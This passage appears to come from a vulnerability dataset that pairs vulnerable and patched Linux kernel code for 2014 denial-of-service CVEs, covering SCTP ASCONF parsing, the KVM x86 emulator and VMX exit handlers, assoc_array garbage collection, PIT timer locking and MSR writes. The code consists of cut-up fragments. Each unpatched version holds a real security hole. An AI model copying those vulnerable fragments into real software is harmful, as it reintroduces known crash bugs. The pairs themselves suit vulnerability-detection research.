 if (!all_param_pass)
 sctp_add_asconf_response(asconf_ack,
						 asconf_param->crr_id, err_code,
						 asconf_param);

 /* ADDIP 4.3 D11) When an endpoint receiving an ASCONF to add
		 * an IP address sends an 'Out of Resource' in its response, it
		 * MUST also fail any subsequent add or delete requests bundled
		 * in the ASCONF.
 */
 if (SCTP_ERROR_RSRC_LOW == err_code)
 goto done;

 /* Move to the next ASCONF param. */
		length = ntohs(asconf_param->param_hdr.length);
		asconf_param = (void *)asconf_param + length;
		chunk_len -= length;
	}

done:
	asoc->peer.addip_serial++;

 struct sctp_chunk	*asconf_ack = NULL;
 struct sctp_paramhdr	*err_param = NULL;
 sctp_addiphdr_t		*hdr;
 union sctp_addr_param	*addr_param;
	__u32			serial;
 int			length;

 if (!sctp_vtag_verify(chunk, asoc)) {
 sctp_add_cmd_sf(commands, SCTP_CMD_REPORT_BAD_TAG,
	hdr = (sctp_addiphdr_t *)chunk->skb->data;
	serial = ntohl(hdr->serial);

	addr_param = (union sctp_addr_param *)hdr->params;
	length = ntohs(addr_param->p.length);
 if (length < sizeof(sctp_paramhdr_t))
 return sctp_sf_violation_paramlen(net, ep, asoc, type, arg,
			   (void *)addr_param, commands);

 /* Verify the ASCONF chunk before processing it. */
 if (!sctp_verify_asconf(asoc,
			    (sctp_paramhdr_t *)((void *)addr_param + length),
			    (void *)chunk->chunk_end,
			    &err_param))
 return sctp_sf_violation_paramlen(net, ep, asoc, type, arg,
						  (void *)err_param, commands);

	rcvd_serial = ntohl(addip_hdr->serial);

 /* Verify the ASCONF-ACK chunk before processing it. */
 if (!sctp_verify_asconf(asoc,
	    (sctp_paramhdr_t *)addip_hdr->params,
	    (void *)asconf_ack->chunk_end,
	    &err_param))
 return sctp_sf_violation_paramlen(net, ep, asoc, type, arg,
			   (void *)err_param, commands);

"," int, __be16);
struct sctp_chunk *sctp_make_asconf_set_prim(struct sctp_association *asoc,
 union sctp_addr *addr);
bool sctp_verify_asconf(const struct sctp_association *asoc,
  struct sctp_chunk *chunk, bool addr_param_needed,
  struct sctp_paramhdr **errp);
struct sctp_chunk *sctp_process_asconf(struct sctp_association *asoc,
 struct sctp_chunk *asconf);
int sctp_process_asconf_ack(struct sctp_association *asoc,
 return SCTP_ERROR_NO_ERROR;
}

/* Verify the ASCONF packet before we process it. */
bool sctp_verify_asconf(const struct sctp_association *asoc,
 struct sctp_chunk *chunk, bool addr_param_needed,
 struct sctp_paramhdr **errp)
{
 sctp_addip_chunk_t *addip = (sctp_addip_chunk_t *) chunk->chunk_hdr;
 union sctp_params param;
 bool addr_param_seen = false;






 sctp_walk_params(param, addip, addip_hdr.params) {
 size_t length = ntohs(param.p->length);


		*errp = param.p;
 switch (param.p->type) {
 case SCTP_PARAM_ERR_CAUSE:
 break;
 case SCTP_PARAM_IPV4_ADDRESS:
 if (length != sizeof(sctp_ipv4addr_param_t))
 return false;
			addr_param_seen = true;
 break;
 case SCTP_PARAM_IPV6_ADDRESS:
 if (length != sizeof(sctp_ipv6addr_param_t))
 return false;
			addr_param_seen = true;
 break;
 case SCTP_PARAM_ADD_IP:
 case SCTP_PARAM_DEL_IP:
 case SCTP_PARAM_SET_PRIMARY:
 /* In ASCONF chunks, these need to be first. */
 if (addr_param_needed && !addr_param_seen)
 return false;
			length = ntohs(param.addip->param_hdr.length);
 if (length < sizeof(sctp_addip_param_t) +
 sizeof(sctp_paramhdr_t))
 return false;
 break;
 case SCTP_PARAM_SUCCESS_REPORT:
 case SCTP_PARAM_ADAPTATION_LAYER_IND:
 if (length != sizeof(sctp_addip_param_t))
 return false;

 break;
 default:
 /* This is unkown to us, reject! */
 return false;
		}


	}

 /* Remaining sanity checks. */
 if (addr_param_needed && !addr_param_seen)
 return false;
 if (!addr_param_needed && addr_param_seen)
 return false;
 if (param.v != chunk->chunk_end)
 return false;

 return true;
}

/* Process an incoming ASCONF chunk with the next expected serial no. and
struct sctp_chunk *sctp_process_asconf(struct sctp_association *asoc,
 struct sctp_chunk *asconf)
{
 sctp_addip_chunk_t *addip = (sctp_addip_chunk_t *) asconf->chunk_hdr;
 bool all_param_pass = true;
 union sctp_params param;
 sctp_addiphdr_t		*hdr;
 union sctp_addr_param	*addr_param;
 sctp_addip_param_t	*asconf_param;
 struct sctp_chunk	*asconf_ack;

	__be16	err_code;
 int	length = 0;
 int	chunk_len;
	__u32	serial;


	chunk_len = ntohs(asconf->chunk_hdr->length) - sizeof(sctp_chunkhdr_t);
	hdr = (sctp_addiphdr_t *)asconf->skb->data;
 goto done;

 /* Process the TLVs contained within the ASCONF chunk. */
 sctp_walk_params(param, addip, addip_hdr.params) {
 /* Skip preceeding address parameters. */
 if (param.p->type == SCTP_PARAM_IPV4_ADDRESS ||
		    param.p->type == SCTP_PARAM_IPV6_ADDRESS)
 continue;

		err_code = sctp_process_asconf_param(asoc, asconf,
 param.addip);
 /* ADDIP 4.1 A7)
		 * If an error response is received for a TLV parameter,
		 * all TLVs with no response before the failed TLV are
		 * considered successful if not reported.  All TLVs after
		 * the failed response are considered unsuccessful unless
		 * a specific success indication is present for the parameter.
 */
 if (err_code != SCTP_ERROR_NO_ERROR)
			all_param_pass = false;

 if (!all_param_pass)
 sctp_add_asconf_response(asconf_ack, param.addip->crr_id,
						 err_code, param.addip);


 /* ADDIP 4.3 D11) When an endpoint receiving an ASCONF to add
		 * an IP address sends an 'Out of Resource' in its response, it
		 * MUST also fail any subsequent add or delete requests bundled
		 * in the ASCONF.
 */
 if (err_code == SCTP_ERROR_RSRC_LOW)
 goto done;





	}

done:
	asoc->peer.addip_serial++;

 struct sctp_chunk	*asconf_ack = NULL;
 struct sctp_paramhdr	*err_param = NULL;
 sctp_addiphdr_t		*hdr;

	__u32			serial;


 if (!sctp_vtag_verify(chunk, asoc)) {
 sctp_add_cmd_sf(commands, SCTP_CMD_REPORT_BAD_TAG,
	hdr = (sctp_addiphdr_t *)chunk->skb->data;
	serial = ntohl(hdr->serial);







 /* Verify the ASCONF chunk before processing it. */
 if (!sctp_verify_asconf(asoc, chunk, true, &err_param))



 return sctp_sf_violation_paramlen(net, ep, asoc, type, arg,
						  (void *)err_param, commands);

	rcvd_serial = ntohl(addip_hdr->serial);

 /* Verify the ASCONF-ACK chunk before processing it. */
 if (!sctp_verify_asconf(asoc, asconf_ack, false, &err_param))



 return sctp_sf_violation_paramlen(net, ep, asoc, type, arg,
			   (void *)err_param, commands);

"
2014,DoS ,CVE-2014-3647,"	return emulate_exception(ctxt, NM_VECTOR, 0, false);
}

static inline void assign_eip_near(struct x86_emulate_ctxt *ctxt, ulong dst)

{
	switch (ctxt->op_bytes) {
	case 2:
		ctxt->_eip = (u32)dst;
		break;
	case 8:



		ctxt->_eip = dst;
		break;
	default:
		WARN(1, ""unsupported eip assignment size\n"");
	}






}

static inline void jmp_rel(struct x86_emulate_ctxt *ctxt, int rel)
{
	assign_eip_near(ctxt, ctxt->_eip + rel);
}

static u16 get_segment_selector(struct x86_emulate_ctxt *ctxt, unsigned seg)
	case 2: /* call near abs */ {
		long int old_eip;
		old_eip = ctxt->_eip;
		ctxt->_eip = ctxt->src.val;


		ctxt->src.val = old_eip;
		rc = em_push(ctxt);
		break;
	}
	case 4: /* jmp abs */
 ctxt->_eip = ctxt->src.val;
		break;
	case 5: /* jmp far */
		rc = em_jmp_far(ctxt);

static int em_ret(struct x86_emulate_ctxt *ctxt)
{
	ctxt->dst.type = OP_REG;
	ctxt->dst.addr.reg = &ctxt->_eip;
	ctxt->dst.bytes = ctxt->op_bytes;
	return em_pop(ctxt);




}

static int em_ret_far(struct x86_emulate_ctxt *ctxt)
{
	const struct x86_emulate_ops *ops = ctxt->ops;
	struct desc_struct cs, ss;
	u64 msr_data;
	int usermode;
	u16 cs_sel = 0, ss_sel = 0;

	else
		usermode = X86EMUL_MODE_PROT32;




	cs.dpl = 3;
	ss.dpl = 3;
	ops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);
		ss_sel = cs_sel + 8;
		cs.d = 0;
		cs.l = 1;



		break;
	}
	cs_sel |= SELECTOR_RPL_MASK;
	ops->set_segment(ctxt, cs_sel, &cs, 0, VCPU_SREG_CS);
	ops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);

	ctxt->_eip = reg_read(ctxt, VCPU_REGS_RDX);
	*reg_write(ctxt, VCPU_REGS_RSP) = reg_read(ctxt, VCPU_REGS_RCX);

	return X86EMUL_CONTINUE;
}

static int em_call(struct x86_emulate_ctxt *ctxt)
{

	long rel = ctxt->src.val;

	ctxt->src.val = (unsigned long)ctxt->_eip;
	jmp_rel(ctxt, rel);


	return em_push(ctxt);
}

static int em_ret_near_imm(struct x86_emulate_ctxt *ctxt)
{
	int rc;


 ctxt->dst.type = OP_REG;
 ctxt->dst.addr.reg = &ctxt->_eip;
 ctxt->dst.bytes = ctxt->op_bytes;
	rc = emulate_pop(ctxt, &ctxt->dst.val, ctxt->op_bytes);
	if (rc != X86EMUL_CONTINUE)
		return rc;
	rsp_increment(ctxt, ctxt->src.val);

static int em_loop(struct x86_emulate_ctxt *ctxt)
{


	register_address_increment(ctxt, reg_rmw(ctxt, VCPU_REGS_RCX), -1);
	if ((address_mask(ctxt, reg_read(ctxt, VCPU_REGS_RCX)) != 0) &&
	    (ctxt->b == 0xe2 || test_cc(ctxt->b ^ 0x5, ctxt->eflags)))
		jmp_rel(ctxt, ctxt->src.val);

	return X86EMUL_CONTINUE;
}

static int em_jcxz(struct x86_emulate_ctxt *ctxt)
{


	if (address_mask(ctxt, reg_read(ctxt, VCPU_REGS_RCX)) == 0)
		jmp_rel(ctxt, ctxt->src.val);

	return X86EMUL_CONTINUE;
}

static int em_in(struct x86_emulate_ctxt *ctxt)
 break;
 case 0x70 ... 0x7f: /* jcc (short) */
 if (test_cc(ctxt->b, ctxt->eflags))
 jmp_rel(ctxt, ctxt->src.val);
 break;
 case 0x8d: /* lea r16/r32, m */
		ctxt->dst.val = ctxt->src.addr.mem.ea;
 break;
 case 0xe9: /* jmp rel */
 case 0xeb: /* jmp rel short */
 jmp_rel(ctxt, ctxt->src.val);
		ctxt->dst.type = OP_NONE; /* Disable writeback. */
 break;
 case 0xf4:              /* hlt */
 break;
 case 0x80 ... 0x8f: /* jnz rel, etc*/
 if (test_cc(ctxt->b, ctxt->eflags))
 jmp_rel(ctxt, ctxt->src.val);
 break;
 case 0x90 ... 0x9f:     /* setcc r/m8 */
		ctxt->dst.val = test_cc(ctxt->b, ctxt->eflags);
","	return emulate_exception(ctxt, NM_VECTOR, 0, false);
}

static inline int assign_eip_far(struct x86_emulate_ctxt *ctxt, ulong dst,
			       int cs_l)
{
	switch (ctxt->op_bytes) {
	case 2:
		ctxt->_eip = (u32)dst;
		break;
	case 8:
		if ((cs_l && is_noncanonical_address(dst)) ||
		    (!cs_l && (dst & ~(u32)-1)))
			return emulate_gp(ctxt, 0);
		ctxt->_eip = dst;
		break;
	default:
		WARN(1, ""unsupported eip assignment size\n"");
	}
	return X86EMUL_CONTINUE;
}

static inline int assign_eip_near(struct x86_emulate_ctxt *ctxt, ulong dst)
{
	return assign_eip_far(ctxt, dst, ctxt->mode == X86EMUL_MODE_PROT64);
}

static inline int jmp_rel(struct x86_emulate_ctxt *ctxt, int rel)
{
 return assign_eip_near(ctxt, ctxt->_eip + rel);
}

static u16 get_segment_selector(struct x86_emulate_ctxt *ctxt, unsigned seg)
	case 2: /* call near abs */ {
		long int old_eip;
		old_eip = ctxt->_eip;
		rc = assign_eip_near(ctxt, ctxt->src.val);
		if (rc != X86EMUL_CONTINUE)
			break;
		ctxt->src.val = old_eip;
		rc = em_push(ctxt);
		break;
	}
	case 4: /* jmp abs */
 rc = assign_eip_near(ctxt, ctxt->src.val);
		break;
	case 5: /* jmp far */
		rc = em_jmp_far(ctxt);

static int em_ret(struct x86_emulate_ctxt *ctxt)
{
	int rc;
	unsigned long eip;

	rc = emulate_pop(ctxt, &eip, ctxt->op_bytes);
	if (rc != X86EMUL_CONTINUE)
		return rc;

	return assign_eip_near(ctxt, eip);
}

static int em_ret_far(struct x86_emulate_ctxt *ctxt)
{
	const struct x86_emulate_ops *ops = ctxt->ops;
	struct desc_struct cs, ss;
	u64 msr_data, rcx, rdx;
	int usermode;
	u16 cs_sel = 0, ss_sel = 0;

	else
		usermode = X86EMUL_MODE_PROT32;

	rcx = reg_read(ctxt, VCPU_REGS_RCX);
	rdx = reg_read(ctxt, VCPU_REGS_RDX);

	cs.dpl = 3;
	ss.dpl = 3;
	ops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);
		ss_sel = cs_sel + 8;
		cs.d = 0;
		cs.l = 1;
		if (is_noncanonical_address(rcx) ||
		    is_noncanonical_address(rdx))
			return emulate_gp(ctxt, 0);
		break;
	}
	cs_sel |= SELECTOR_RPL_MASK;
	ops->set_segment(ctxt, cs_sel, &cs, 0, VCPU_SREG_CS);
	ops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);

	ctxt->_eip = rdx;
	*reg_write(ctxt, VCPU_REGS_RSP) = rcx;

	return X86EMUL_CONTINUE;
}

static int em_call(struct x86_emulate_ctxt *ctxt)
{
	int rc;
	long rel = ctxt->src.val;

	ctxt->src.val = (unsigned long)ctxt->_eip;
	rc = jmp_rel(ctxt, rel);
	if (rc != X86EMUL_CONTINUE)
		return rc;
	return em_push(ctxt);
}

static int em_ret_near_imm(struct x86_emulate_ctxt *ctxt)
{
	int rc;
	unsigned long eip;

 rc = emulate_pop(ctxt, &eip, ctxt->op_bytes);
 if (rc != X86EMUL_CONTINUE)
 	return rc;
	rc = assign_eip_near(ctxt, eip);
	if (rc != X86EMUL_CONTINUE)
		return rc;
	rsp_increment(ctxt, ctxt->src.val);

static int em_loop(struct x86_emulate_ctxt *ctxt)
{
	int rc = X86EMUL_CONTINUE;

	register_address_increment(ctxt, reg_rmw(ctxt, VCPU_REGS_RCX), -1);
	if ((address_mask(ctxt, reg_read(ctxt, VCPU_REGS_RCX)) != 0) &&
	    (ctxt->b == 0xe2 || test_cc(ctxt->b ^ 0x5, ctxt->eflags)))
 rc = jmp_rel(ctxt, ctxt->src.val);

	return rc;
}

static int em_jcxz(struct x86_emulate_ctxt *ctxt)
{
	int rc = X86EMUL_CONTINUE;

	if (address_mask(ctxt, reg_read(ctxt, VCPU_REGS_RCX)) == 0)
 rc = jmp_rel(ctxt, ctxt->src.val);

	return rc;
}

static int em_in(struct x86_emulate_ctxt *ctxt)
 break;
 case 0x70 ... 0x7f: /* jcc (short) */
 if (test_cc(ctxt->b, ctxt->eflags))
 rc = jmp_rel(ctxt, ctxt->src.val);
 break;
 case 0x8d: /* lea r16/r32, m */
		ctxt->dst.val = ctxt->src.addr.mem.ea;
 break;
 case 0xe9: /* jmp rel */
 case 0xeb: /* jmp rel short */
 rc = jmp_rel(ctxt, ctxt->src.val);
		ctxt->dst.type = OP_NONE; /* Disable writeback. */
 break;
 case 0xf4:              /* hlt */
 break;
 case 0x80 ... 0x8f: /* jnz rel, etc*/
 if (test_cc(ctxt->b, ctxt->eflags))
 rc = jmp_rel(ctxt, ctxt->src.val);
 break;
 case 0x90 ... 0x9f:     /* setcc r/m8 */
		ctxt->dst.val = test_cc(ctxt->b, ctxt->eflags);
"
2014,DoS ,CVE-2014-3646,"#define EXIT_REASON_EPT_MISCONFIG 49
#define EXIT_REASON_INVEPT 50
#define EXIT_REASON_PREEMPTION_TIMER 52

#define EXIT_REASON_WBINVD 54
#define EXIT_REASON_XSETBV 55
#define EXIT_REASON_APIC_WRITE 56
	{ EXIT_REASON_EOI_INDUCED,           ""EOI_INDUCED"" }, \
	{ EXIT_REASON_INVALID_STATE,         ""INVALID_STATE"" }, \
	{ EXIT_REASON_INVD,                  ""INVD"" }, \

	{ EXIT_REASON_INVPCID,               ""INVPCID"" }

#endif /* _UAPIVMX_H */
 return 1;
}







/*
 * The exit handlers return 1 if the exit was handled fully and guest execution
 * may resume.  Otherwise they set the kvm_run parameter to indicate what needs
	[EXIT_REASON_MWAIT_INSTRUCTION]	      = handle_mwait,
	[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_monitor,
	[EXIT_REASON_INVEPT]                  = handle_invept,

};

static const int kvm_vmx_max_exit_handlers =
 case EXIT_REASON_VMPTRST: case EXIT_REASON_VMREAD:
 case EXIT_REASON_VMRESUME: case EXIT_REASON_VMWRITE:
 case EXIT_REASON_VMOFF: case EXIT_REASON_VMON:
 case EXIT_REASON_INVEPT:
 /*
		 * VMX instructions trap unconditionally. This allows L1 to
		 * emulate them for its L2 guest, i.e., allows 3-level nesting!
","#define EXIT_REASON_EPT_MISCONFIG 49
#define EXIT_REASON_INVEPT 50
#define EXIT_REASON_PREEMPTION_TIMER 52
#define EXIT_REASON_INVVPID 53
#define EXIT_REASON_WBINVD 54
#define EXIT_REASON_XSETBV 55
#define EXIT_REASON_APIC_WRITE 56
	{ EXIT_REASON_EOI_INDUCED,           ""EOI_INDUCED"" }, \
	{ EXIT_REASON_INVALID_STATE,         ""INVALID_STATE"" }, \
	{ EXIT_REASON_INVD,                  ""INVD"" }, \
	{ EXIT_REASON_INVVPID,               ""INVVPID"" }, \
	{ EXIT_REASON_INVPCID,               ""INVPCID"" }

#endif /* _UAPIVMX_H */
 return 1;
}

static int handle_invvpid(struct kvm_vcpu *vcpu)
{
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 1;
}

/*
 * The exit handlers return 1 if the exit was handled fully and guest execution
 * may resume.  Otherwise they set the kvm_run parameter to indicate what needs
	[EXIT_REASON_MWAIT_INSTRUCTION]	      = handle_mwait,
	[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_monitor,
	[EXIT_REASON_INVEPT]                  = handle_invept,
	[EXIT_REASON_INVVPID]                 = handle_invvpid,
};

static const int kvm_vmx_max_exit_handlers =
 case EXIT_REASON_VMPTRST: case EXIT_REASON_VMREAD:
 case EXIT_REASON_VMRESUME: case EXIT_REASON_VMWRITE:
 case EXIT_REASON_VMOFF: case EXIT_REASON_VMON:
 case EXIT_REASON_INVEPT: case EXIT_REASON_INVVPID:
 /*
		 * VMX instructions trap unconditionally. This allows L1 to
		 * emulate them for its L2 guest, i.e., allows 3-level nesting!
"
2014,DoS ,CVE-2014-3645,"#define VMX_EPT_EXTENT_INDIVIDUAL_ADDR 0
#define VMX_EPT_EXTENT_CONTEXT 1
#define VMX_EPT_EXTENT_GLOBAL 2


#define VMX_EPT_EXECUTE_ONLY_BIT		(1ull)
#define VMX_EPT_PAGE_WALK_4_BIT			(1ull << 6)
#define VMX_EPTP_UC_BIT				(1ull << 8)
#define VMX_EPTP_WB_BIT				(1ull << 14)
#define VMX_EPT_2MB_PAGE_BIT			(1ull << 16)
#define VMX_EPT_1GB_PAGE_BIT			(1ull << 17)

#define VMX_EPT_AD_BIT				    (1ull << 21)
#define VMX_EPT_EXTENT_CONTEXT_BIT		(1ull << 25)
#define VMX_EPT_EXTENT_GLOBAL_BIT		(1ull << 26)
#define EXIT_REASON_EOI_INDUCED 45
#define EXIT_REASON_EPT_VIOLATION 48
#define EXIT_REASON_EPT_MISCONFIG 49

#define EXIT_REASON_PREEMPTION_TIMER 52
#define EXIT_REASON_WBINVD 54
#define EXIT_REASON_XSETBV 55
 mmu_sync_roots(vcpu);
 spin_unlock(&vcpu->kvm->mmu_lock);
}


static gpa_t nonpaging_gva_to_gpa(struct kvm_vcpu *vcpu, gva_t vaddr,
				  u32 access, struct x86_exception *exception)
	++vcpu->stat.tlb_flush;
 kvm_make_request(KVM_REQ_TLB_FLUSH, vcpu);
}


static void paging_new_cr3(struct kvm_vcpu *vcpu)
{
 kvm_release_page_clean(page);
}


static u64 construct_eptp(unsigned long root_hpa);
static void kvm_cpu_vmxon(u64 addr);
static void kvm_cpu_vmxoff(void);
static u32 nested_vmx_exit_ctls_low, nested_vmx_exit_ctls_high;
static u32 nested_vmx_entry_ctls_low, nested_vmx_entry_ctls_high;
static u32 nested_vmx_misc_low, nested_vmx_misc_high;

static __init void nested_vmx_setup_ctls_msrs(void)
{
 /*
 return 1;
}





































































/*
 * The exit handlers return 1 if the exit was handled fully and guest execution
 * may resume.  Otherwise they set the kvm_run parameter to indicate what needs
	[EXIT_REASON_PAUSE_INSTRUCTION]       = handle_pause,
	[EXIT_REASON_MWAIT_INSTRUCTION]	      = handle_invalid_op,
	[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_invalid_op,

};

static const int kvm_vmx_max_exit_handlers =
 case EXIT_REASON_VMPTRST: case EXIT_REASON_VMREAD:
 case EXIT_REASON_VMRESUME: case EXIT_REASON_VMWRITE:
 case EXIT_REASON_VMOFF: case EXIT_REASON_VMON:

 /*
		 * VMX instructions trap unconditionally. This allows L1 to
		 * emulate them for its L2 guest, i.e., allows 3-level nesting!
","#define VMX_EPT_EXTENT_INDIVIDUAL_ADDR 0
#define VMX_EPT_EXTENT_CONTEXT 1
#define VMX_EPT_EXTENT_GLOBAL 2
#define VMX_EPT_EXTENT_SHIFT 24

#define VMX_EPT_EXECUTE_ONLY_BIT		(1ull)
#define VMX_EPT_PAGE_WALK_4_BIT			(1ull << 6)
#define VMX_EPTP_UC_BIT				(1ull << 8)
#define VMX_EPTP_WB_BIT				(1ull << 14)
#define VMX_EPT_2MB_PAGE_BIT			(1ull << 16)
#define VMX_EPT_1GB_PAGE_BIT			(1ull << 17)
#define VMX_EPT_INVEPT_BIT			(1ull << 20)
#define VMX_EPT_AD_BIT				    (1ull << 21)
#define VMX_EPT_EXTENT_CONTEXT_BIT		(1ull << 25)
#define VMX_EPT_EXTENT_GLOBAL_BIT		(1ull << 26)
#define EXIT_REASON_EOI_INDUCED 45
#define EXIT_REASON_EPT_VIOLATION 48
#define EXIT_REASON_EPT_MISCONFIG 49
#define EXIT_REASON_INVEPT 50
#define EXIT_REASON_PREEMPTION_TIMER 52
#define EXIT_REASON_WBINVD 54
#define EXIT_REASON_XSETBV 55
 mmu_sync_roots(vcpu);
 spin_unlock(&vcpu->kvm->mmu_lock);
}
EXPORT_SYMBOL_GPL(kvm_mmu_sync_roots);

static gpa_t nonpaging_gva_to_gpa(struct kvm_vcpu *vcpu, gva_t vaddr,
				  u32 access, struct x86_exception *exception)
	++vcpu->stat.tlb_flush;
 kvm_make_request(KVM_REQ_TLB_FLUSH, vcpu);
}
EXPORT_SYMBOL_GPL(kvm_mmu_flush_tlb);

static void paging_new_cr3(struct kvm_vcpu *vcpu)
{
 kvm_release_page_clean(page);
}

static unsigned long nested_ept_get_cr3(struct kvm_vcpu *vcpu);
static u64 construct_eptp(unsigned long root_hpa);
static void kvm_cpu_vmxon(u64 addr);
static void kvm_cpu_vmxoff(void);
static u32 nested_vmx_exit_ctls_low, nested_vmx_exit_ctls_high;
static u32 nested_vmx_entry_ctls_low, nested_vmx_entry_ctls_high;
static u32 nested_vmx_misc_low, nested_vmx_misc_high;
static u32 nested_vmx_ept_caps;
static __init void nested_vmx_setup_ctls_msrs(void)
{
 /*
 return 1;
}

/* Emulate the INVEPT instruction */
static int handle_invept(struct kvm_vcpu *vcpu)
{
	u32 vmx_instruction_info, types;
 unsigned long type;
 gva_t gva;
 struct x86_exception e;
 struct {
		u64 eptp, gpa;
	} operand;
	u64 eptp_mask = ((1ull << 51) - 1) & PAGE_MASK;

 if (!(nested_vmx_secondary_ctls_high & SECONDARY_EXEC_ENABLE_EPT) ||
	    !(nested_vmx_ept_caps & VMX_EPT_INVEPT_BIT)) {
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 1;
	}

 if (!nested_vmx_check_permission(vcpu))
 return 1;

 if (!kvm_read_cr0_bits(vcpu, X86_CR0_PE)) {
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 1;
	}

	vmx_instruction_info = vmcs_read32(VMX_INSTRUCTION_INFO);
	type = kvm_register_read(vcpu, (vmx_instruction_info >> 28) & 0xf);

	types = (nested_vmx_ept_caps >> VMX_EPT_EXTENT_SHIFT) & 6;

 if (!(types & (1UL << type))) {
 nested_vmx_failValid(vcpu,
				VMXERR_INVALID_OPERAND_TO_INVEPT_INVVPID);
 return 1;
	}

 /* According to the Intel VMX instruction reference, the memory
	 * operand is read even if it isn't needed (e.g., for type==global)
 */
 if (get_vmx_mem_address(vcpu, vmcs_readl(EXIT_QUALIFICATION),
			vmx_instruction_info, &gva))
 return 1;
 if (kvm_read_guest_virt(&vcpu->arch.emulate_ctxt, gva, &operand,
 sizeof(operand), &e)) {
 kvm_inject_page_fault(vcpu, &e);
 return 1;
	}

 switch (type) {
 case VMX_EPT_EXTENT_CONTEXT:
 if ((operand.eptp & eptp_mask) !=
				(nested_ept_get_cr3(vcpu) & eptp_mask))
 break;
 case VMX_EPT_EXTENT_GLOBAL:
 kvm_mmu_sync_roots(vcpu);
 kvm_mmu_flush_tlb(vcpu);
 nested_vmx_succeed(vcpu);
 break;
 default:
 BUG_ON(1);
 break;
	}

 skip_emulated_instruction(vcpu);
 return 1;
}

/*
 * The exit handlers return 1 if the exit was handled fully and guest execution
 * may resume.  Otherwise they set the kvm_run parameter to indicate what needs
	[EXIT_REASON_PAUSE_INSTRUCTION]       = handle_pause,
	[EXIT_REASON_MWAIT_INSTRUCTION]	      = handle_invalid_op,
	[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_invalid_op,
	[EXIT_REASON_INVEPT]                  = handle_invept,
};

static const int kvm_vmx_max_exit_handlers =
 case EXIT_REASON_VMPTRST: case EXIT_REASON_VMREAD:
 case EXIT_REASON_VMRESUME: case EXIT_REASON_VMWRITE:
 case EXIT_REASON_VMOFF: case EXIT_REASON_VMON:
 case EXIT_REASON_INVEPT:
 /*
		 * VMX instructions trap unconditionally. This allows L1 to
		 * emulate them for its L2 guest, i.e., allows 3-level nesting!
"
2014,DoS ,CVE-2014-3631,"		shortcut = assoc_array_ptr_to_shortcut(ptr);
		slot = shortcut->parent_slot;
		cursor = shortcut->back_pointer;


	} else {
		slot = node->parent_slot;
		cursor = ptr;
	}
 BUG_ON(!ptr);
	node = assoc_array_ptr_to_node(cursor);
	slot++;
 goto continue_node;
","		shortcut = assoc_array_ptr_to_shortcut(ptr);
		slot = shortcut->parent_slot;
		cursor = shortcut->back_pointer;
 if (!cursor)
 goto gc_complete;
	} else {
		slot = node->parent_slot;
		cursor = ptr;
	}
 BUG_ON(!cursor);
	node = assoc_array_ptr_to_node(cursor);
	slot++;
 goto continue_node;
"
2014,DoS ,CVE-2014-3611," return;

	timer = &pit->pit_state.timer;

 if (hrtimer_cancel(timer))
 hrtimer_start_expires(timer, HRTIMER_MODE_ABS);

}

static void destroy_pit_timer(struct kvm_pit *pit)
"," return;

	timer = &pit->pit_state.timer;
 mutex_lock(&pit->pit_state.lock);
 if (hrtimer_cancel(timer))
 hrtimer_start_expires(timer, HRTIMER_MODE_ABS);
 mutex_unlock(&pit->pit_state.lock);
}

static void destroy_pit_timer(struct kvm_pit *pit)
"
2014,DoS ,CVE-2014-3610," kvm_queue_exception_e(vcpu, GP_VECTOR, error_code);
}















#define TSS_IOPB_BASE_OFFSET 0x66
#define TSS_BASE_SIZE 0x68
#define TSS_IOPB_SIZE (65536 / 8)
	msr.host_initiated = false;

	svm->next_rip = kvm_rip_read(&svm->vcpu) + 2;
 if (svm_set_msr(&svm->vcpu, &msr)) {
 trace_kvm_msr_write_ex(ecx, data);
 kvm_inject_gp(&svm->vcpu, 0);
	} else {
	msr.data = data;
	msr.index = ecx;
	msr.host_initiated = false;
 if (vmx_set_msr(vcpu, &msr) != 0) {
 trace_kvm_msr_write_ex(ecx, data);
 kvm_inject_gp(vcpu, 0);
 return 1;
}
EXPORT_SYMBOL_GPL(kvm_enable_efer_bits);


/*
 * Writes msr value into into the appropriate ""register"".
 * Returns 0 on success, non-0 otherwise.
 * Assumes vcpu_load() was already called.
 */
int kvm_set_msr(struct kvm_vcpu *vcpu, struct msr_data *msr)
{

























 return kvm_x86_ops->set_msr(vcpu, msr);
}


/*
 * Adapt set_msr() to msr_io()'s calling convention
"," kvm_queue_exception_e(vcpu, GP_VECTOR, error_code);
}

static inline u64 get_canonical(u64 la)
{
 return ((int64_t)la << 16) >> 16;
}

static inline bool is_noncanonical_address(u64 la)
{
#ifdef CONFIG_X86_64
 return get_canonical(la) != la;
#else
 return false;
#endif
}

#define TSS_IOPB_BASE_OFFSET 0x66
#define TSS_BASE_SIZE 0x68
#define TSS_IOPB_SIZE (65536 / 8)
	msr.host_initiated = false;

	svm->next_rip = kvm_rip_read(&svm->vcpu) + 2;
 if (kvm_set_msr(&svm->vcpu, &msr)) {
 trace_kvm_msr_write_ex(ecx, data);
 kvm_inject_gp(&svm->vcpu, 0);
	} else {
	msr.data = data;
	msr.index = ecx;
	msr.host_initiated = false;
 if (kvm_set_msr(vcpu, &msr) != 0) {
 trace_kvm_msr_write_ex(ecx, data);
 kvm_inject_gp(vcpu, 0);
 return 1;
}
EXPORT_SYMBOL_GPL(kvm_enable_efer_bits);


/*
 * Writes msr value into into the appropriate ""register"".
 * Returns 0 on success, non-0 otherwise.
 * Assumes vcpu_load() was already called.
 */
int kvm_set_msr(struct kvm_vcpu *vcpu, struct msr_data *msr)
{
 switch (msr->index) {
 case MSR_FS_BASE:
 case MSR_GS_BASE:
 case MSR_KERNEL_GS_BASE:
 case MSR_CSTAR:
 case MSR_LSTAR:
 if (is_noncanonical_address(msr->data))
 return 1;
 break;
 case MSR_IA32_SYSENTER_EIP:
 case MSR_IA32_SYSENTER_ESP:
 /*
		 * IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if
		 * non-canonical address is written on Intel but not on
		 * AMD (which ignores the top 32-bits, because it does
		 * not implement 64-bit SYSENTER).
		 *
		 * 64-bit code should hence be able to write a non-canonical
